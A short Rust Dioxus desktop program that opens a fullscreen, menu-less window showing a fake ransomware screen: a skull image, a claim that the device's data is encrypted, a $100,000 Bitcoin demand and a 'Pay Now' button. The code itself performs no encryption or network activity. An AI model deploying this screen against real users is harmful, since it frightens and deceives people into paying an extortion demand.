use dioxus::{desktop::WindowBuilder, prelude::*};
use dioxus_desktop::{use_window, Config};

const MAIN_CSS: Asset = asset!("/assets/styling/main.css");
const SKULL: Asset = asset!("/assets/skull.png");

fn main() {
    dioxus::LaunchBuilder::new()
        .with_cfg(
            Config::default()
                .with_menu(None)
                .with_window(WindowBuilder::new().with_maximized(true)),
        )
        .launch(app);
}

#[component]
fn app() -> Element {
    let window = use_window();
    use_effect(move || {
        window.set_fullscreen(true);
    });

    rsx! {
        document::Stylesheet {href: MAIN_CSS }
        div {
            text_align: "center",
            class: "crt",
            img { src: SKULL }
            h1 { "Your Data Has Been Encrypted"}
            p { "This device is infected by ransomware. All data of yours encrypted, no you can open it without password"}
            p { "Pay $100,000 in Bitcoin to get password."}
            button { "Pay Now" }
        }
    }
}
